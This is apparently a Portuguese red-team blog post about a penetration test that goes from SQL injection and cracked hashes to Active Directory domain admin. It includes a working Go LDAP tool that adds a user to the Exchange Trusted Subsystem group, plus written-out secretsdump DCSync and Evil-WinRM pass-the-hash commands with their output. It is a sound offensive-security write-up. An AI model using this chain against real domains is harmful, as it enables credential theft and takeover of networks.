---
layout: post
title: Sometimes you gotta close a door to open a Windows.
date: 2023-04-24 17:30:50 +0800
categories: [Red Team, Active Directory]
tags: [Red Team]
---


Como um pentester, diferentes cenários para exploração tornam-se rotineiros. E, por consequência, cenários peculiares também entram na lista do que um pentester irá enfrentar durante seu teste.

Durante um teste de intrusão, eu e meu colega de trabalho, [oppsec](https://www.linkedin.com/in/dansdm), nos deparamos com um cenário específico: conseguimos acesso de administrador de domínio sem antes ter comprometido um único Windows. Sem movimentação lateral, sem CVEs, sem acesso inicial, sem exfiltração de dados. Utilizamos unicamente o nosso sistema para obtermos acesso de DA.

## Reconhecimento.

Nos encontrávamos em uma rede que continha mais de 15 faixas de IPs, e geralmente com uma subnet de /23 ou /24 (em tornos de 512 ou 256 ativos por range). Como processo inicial, nada melhor que uma boa enumeração da infraestrutura. Para isso, utilizamos o clássico NMAP para varrermos endereços com portas comumente encontradas, tais como: 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3389 (RDP) e 5985 (WinRM).

Durante o processo de reconhecimento, foram encontrados alguns serviços web que foram de grande valia para a exploração. Dentre eles, um serviço de HelpDesk que aceitava autenticação de usuários do Active Directory. Como já tínhamos acesso a um usuário (não privilegiado) antes, conseguimos nos autenticar no serviço como usuário comum.

Após acessarmos tal aplicação, nos deparamos com diversas opções que serviam como auxílio aos colaboradores da companhia. Como por exemplo, descrevia como acessar um sistema específico, como solicitar ajuda em um problema técnico, entre outros. Decidimos por analisar todos os tópicos contidos na documentação e, ao ver um chamado em aberto, acabamos por achar uma aplicação conveniente para nossa situação.

Se tratava de um sistema de gerenciamento de assinaturas de e-mail feito em PHP, que por sua vez, poderia ter diversas vulnerabilidades que nos renderiam algum acesso ou informações privilegiadas sobre algum usuário da rede.

## SQL Injection.

Na aplicação encontrada, existiam alguns funções como: selecionar um funcionário específico da rede, modelo especifico da assinatura e afins. Visto isso, fizemos uma seleção aleatória e clicamos no botão de “Processar” para que a assinatura fosse gerada.

Com a assinatura montada pela aplicação, notamos que existiam parâmetros repassados via GET e que, por sua vez, poderiam estar vulneráveis a ataques de injeção de SQL. E, para nossa felicidade (rs), ao repassarmos uma aspas simples a um dos parâmetros, o seguinte erro aparecia:

```sql
-- SQL ERROR (ilustração do erro)
Warning: pg_query(): Query failed: ERROR: syntax error at or near "137" LINE 3: select * from
TESTE where valor = '4362'';

ERROR: syntax error at or near "137" LINE 1: select * from where valor= '4362'; ^
| where valor= '4362''; ^ in /var/www/wwwsite/modulo/req.php on line 122'
```

Por se tratar de uma vulnerabilidade que afeta diretamente o banco de dados, foi possível realizar operações que retornassem informações confidenciais sobre ele, como: exibição da versão, exibição das databases, tabelas, colunas, entre outros.

Durante o ataque, foi possível notar que existia uma coluna chamada "senhas", infelizmente criptografadas. Com isso em mente, utilizamos um ótimo site de quebra de hashes online, o [CMD5.org](https://www.cmd5.org/), que possibilitou que quebrássemos algumas senhas. Dentre elas, de um usuário em específico que nos rendeu um acesso melhor na rede.

![Desktop View](/assets/imagens/posts/senha.png)

Durante o reconhecimento das máquinas e seus respectivos serviços, notamos que existia um endereço que hospedava um serviço de HelpDesk, conforme citado durante o processo de reconhecimento. Com as novas credenciais em mãos, conseguimos logar na plataforma como administrador!

Ao analisarmos os chamados que foram abertos, que antes não tínhamos permissão de visualizá-los alguns, notamos um que chamou nossa atenção: reset de senha do TeamPass.

O TeamPass trata-se de um software de gerenciamento de senhas colaborativo entre membros que fazem parte do grupo de acesso. Com as credenciais que obtemos ao abrirmos o ticket, conseguimos logar na plataforma. Algumas das senhas armazenadas foram válidas, e nos permitiu acesso a alguns diferentes serviços na rede. Mas, o que almejávamos era um acesso inicial a uma máquina Windows, que, infelizmente, não ocorreu. =[

## BloodHound.

Por conta disso, resolvemos analisar melhor o ambiente. Para isso, utilizamos a ferramenta [RustHound](https://github.com/OPENCYBER-FR/RustHound) (uma implementação do SharpHound, mas em Rust), que serviu para enumeração de usuários, grupos, ACLs, entre outros, do domínio. Após a finalização do RustHound e seus arquivos JSON serem exportados ao BloodHound, foi possível notar um caminho em específico que chamou a nossa atenção. Veja:

![Desktop View](/assets/imagens/posts/bd1.png)

Note, conforme exibido na imagem acima, que foi possível identificar um usuário que estava alocado no grupo de Account Operators. O diferencial deste usuário é que ele tinha sua senha cadastrada no TeamPass, serviço anteriormente comprometido. O grupo Account Operators, no Active Directory, é um grupo de segurança pré-definido que permite aos seus membros gerenciar contas de usuário e grupos em um domínio.

Por conta deste usuário pertencer ao grupo Account Operators, a maneira mais eficiente de exploração seria nos alocarmos em um grupo que tenha permissão GenericAll sobre o domínio, para que assim, seja feito um ataque de DCSync. Vale ressaltar que o grupo “Account Operators” nos oferece permissão para adicionarmos membros nestes grupos.

![Desktop View](/assets/imagens/posts/bloohound3.png)
_Os membros do grupo Account Operators tem permissão geral sobre o grupo EXCHANGE TRUSTED SUBSYSTEM_

O Exchange Trusted Subsystem é um grupo de alto privilégio que tem acesso de escrita e leitura a qualquer objeto relacionado ao Exchange da organização, e assim, ele poderá servir de ponte para o ataque citado anteriormente.

![Desktop View](/assets/imagens/posts/bloodhound2.png)

Note que o grupo "EXCHANGE TRUSTED SUBSYSTEM" tem privilégio de GenericAll sobre o domínio. Tendo isso em mente, partiremos para a exploração. Um ataque DCSync é um método em que invasores executam processos que se comportam como um controlador de domínio e usam o protocolo remoto do Directory Replication Service (DRS) para replicar informações do AD, tal como a hash NTLM do usuário especificado pelo atacante.

Porém, temos um problema: não temos nenhum tipo de acesso inicial a algum Windows para que executemos este ataque. Caso tivéssemos alguma shell em um Windows no domínio com o usuário recém-comprometido, bastávamos executar comandos do CMD que nos adicionasse ao grupo, como o comando "net group".

A solução foi interagir diretamente com o protocolo LDAP para a adição de nosso usuário ao grupo “EXCHANGE TRUSTED SUBSYSTEM”, para que assim, tenhamos permissão de replicar hashes NTLM. Foi desenvolvido uma ferramenta em Golang que fará a soma do usuário ao grupo.

```go
package main

import (
   "fmt"
   "github.com/go-ldap/ldap/v3"
   "log"
)

func main() {
   ldapServer := "ldap://DOMAINCONTROLLER.dominio.local"
   ldapUser := "CN=usuario.atacante,CN=Users,DC=dominio,DC=local"
   ldapPassword := "Senha123456"

   conn, err := ldap.DialURL(ldapServer)
   if err != nil {
      log.Fatalf("Não foi possível conectar ao servidor LDAP: %v", err)
   }
   defer conn.Close()

   err = conn.Bind(ldapUser, ldapPassword)
   if err != nil {
      log.Fatalf("Não foi possível realizar o bind: %v", err)
   }

   userSearchFilter := "(&(objectClass=user)(objectCategory=person)(sAMAccountName=usuario.atacante))"
   userSearchBase := "DC=dominio,DC=local"
   userSearchAttributes := []string{"dn"}

   userSearchRequest := ldap.NewSearchRequest(
      userSearchBase,
      ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
      userSearchFilter,
      userSearchAttributes,
      nil,
   )

   userSearchResult, err := conn.Search(userSearchRequest)
   if err != nil || len(userSearchResult.Entries) != 1 {
      log.Fatalf("Erro ao buscar usuário usuario.atacante: %v", err)
   }

   userDN := userSearchResult.Entries[0].DN

   groupSearchFilter := "(&(objectClass=group)(cn=EXCHANGE TRUSTED SUBSYSTEM))"
   groupSearchBase := "DC=dominio,DC=local"

   groupSearchRequest := ldap.NewSearchRequest(
      groupSearchBase,
      ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
      groupSearchFilter,
      []string{"dn"},
      nil,
   )

   groupSearchResult, err := conn.Search(groupSearchRequest)
   if err != nil || len(groupSearchResult.Entries) != 1 {
      log.Fatalf("Erro ao buscar grupo EXCHANGE TRUSTED SUBSYSTEM: %v", err)
   }

   groupDN := groupSearchResult.Entries[0].DN

   modify := ldap.NewModifyRequest(groupDN, nil)
   modify.Add("member", []string{userDN})

   err = conn.Modify(modify)
   if err != nil {
      log.Fatalf("Erro ao adicionar usuário ao grupo: %v", err)
   }

   fmt.Println("Usuário usuario.atacante adicionado ao grupo EXCHANGE TRUSTED SUBSYSTEM com sucesso!")
}
```

Com a execução do script acima, para checarmos se fomos de fato adicionados ao grupo especificado, utilizamos a ferramenta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec), que fará a verificação dos grupos do nosso usuário por meio do módulo "whoami" do protocolo LDAP.

```
[m1kasa(@massiveattack) ~/ferramentas/CrackMapExec]$ poetry run crackmapexec ldap DOMAINCONTROLLER.dominio.local -u "usuario.atacante" -p 'Senha123456' -M whoami
SMB         10.10.10.100    445    DC               [*] Windows Server 2016 Build 7601 x64 (name:DC) (domain:dominio.local) (signing:True) (SMBv1:False)
LDAP        10.10.10.100    389    DC               [+] dominio.local\usuario.atacante:SenhaDoAtacante123 (Pwn3d!)
WHOAMI      10.10.10.100    389    DC               distinguishedName: CN=usuario.atacante,CN=Users,DC=dominio,DC=local
WHOAMI      10.10.10.100    389    DC               Member of: CN=EXCHANGE TRUSTED SUBSYSTEM,CN=Builtin,DC=dominio,DC=local
```

## PASS-THE-HASH 4 THE WIN!

Conforme exibido, temos a comprovação de que o script em Golang funcionou perfeitamente, e que agora o nosso usuário está no grupo "EXCHANGE TRUSTED SUBSYSTEM"! Feito isso, utilizaremos a ferramenta secretsdump.py, da coleção Impacket, para realizarmos o ataque. Vale ressaltar que o grupo recém-adicionado ao usuário tem permissão de GenericAll sobre o domínio.

```
[m1kasa(@massiveattack) ~/ferramentas/impacket/examples]$ python3 secretsdump.py dominio.local/usuario.atacante:'Senha123456'@DOMAINCONTROLLER.dominio.local -just-dc-ntlm -just-dc -just-dc-user "usuario.admin" -debug
Impacket v0.10.1.dev1+20220820.103933.3c5713e4 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for usuario.admin
[+] Calling DRSGetNCChanges for {8c9d3235-1d0a-4db1-99ee-3f783d1a9bd6}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=usuario.admin,CN=Users,DC=dominio,DC=local
dominio.local\usuario.admin:1103:aad3b435b51404eeaad3b435b51404ee:90eb12753d51c7c3ee2fe10fe224592f:::
[+] Leaving NTDSHashes.__decryptHash
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Cleaning up...
```

Com a hash em mãos, iremos desfrutar da ferramenta chamada de [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). A ferramenta possibilita que obtenhamos uma sessão PowerShell utilizando o protocolo WinRM, onde este se trata de um protocolo para conexão remota via linha de comando (se assemelhando ao SSH). O diferencial é que a ferramenta suporta ataques de Pass-The-Hash!

```
[m1kasa(@massiveattack) ~/ferramentas/evil-winrm]$ ruby evil-winrm.rb -i DOMAINCONTROLLER.dominio.local -u "usuario.admin" -H 90eb12753d51c7c3ee2fe10fe224592f

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\usuario.admin\Documents> whoami
dominio.local\usuario.admin
```

Conseguimos! Comprometemos o Domain Controller, e além do mais, com usuário administrativo! Somos administradores do domínio! Por consequência, conseguimos comprometer também todos os outros Windows que fazem parte do domínio.

## Conclusão.

Durante a leitura do artigo, vimos sobre diferentes técnicas de ataques e como correlacioná-las pode ser útil em cenários como foi visto. Foram abordados desde exploração de vulnerabilidade web, até ataques em ambientes Active Directory, onde exigiam por parte do atacante uma boa base sobre a estrutura do AD, tais como análise de ACLs, conhecimento de protocolos, maneiras alternativas de autenticação, entre outros.

Abaixo, uma lista do que foi abordado:

- Reconhecimento
- Injeção de SQL
- Hash Craking
- BloodHound: análise de ACLs
- Programação
- DCSync (dump de hashes NTLM)
- Pass-The-Hash

Esperamos que a leitura tenha sido interessante e que ajudem-os em casos parecidos! O principal intuito do artigo é mostrar que as vulnerabilidades podem ser utilizadas em conjunto para obter um acesso ainda maior na rede. Desde já, somos gratos por ter lido até aqui.
